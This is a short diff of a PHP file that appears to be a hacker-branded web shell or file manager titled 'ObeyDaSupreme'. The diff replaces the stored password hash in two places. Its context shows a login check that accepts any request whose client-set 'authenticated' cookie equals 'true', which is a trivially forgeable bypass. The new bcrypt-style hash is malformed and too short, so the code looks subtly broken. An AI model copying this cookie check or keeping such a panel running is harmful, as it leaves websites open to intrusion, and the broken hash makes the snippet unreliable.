@@ -1,6 +1,6 @@
 
 <?php
-$pass_hash = '0712b2b5ca9b8d8e387e0efcbc45c403';
+$pass_hash = '$2y$10$eNqZ9KcIqk7Nld9NjaywtuExnh1Y';
 
 // Cek cookie login
 if (isset($_COOKIE['authenticated']) && $_COOKIE['authenticated'] === 'true') {
@@ -119,7 +119,7 @@ define('APP_TITLE', 'ObeyDaSupreme');
 // Is independent from IP white- and blacklisting
 $use_auth = true;
 $auth_users = array(
-    'OBS' => '0712b2b5ca9b8d8e387e0efcbc45c403', 
+    'OBS' => '$2y$10$eNqZ9KcIqk7Nld9NjaywtuExnh1Y', 
 );
 
 // Readonly users
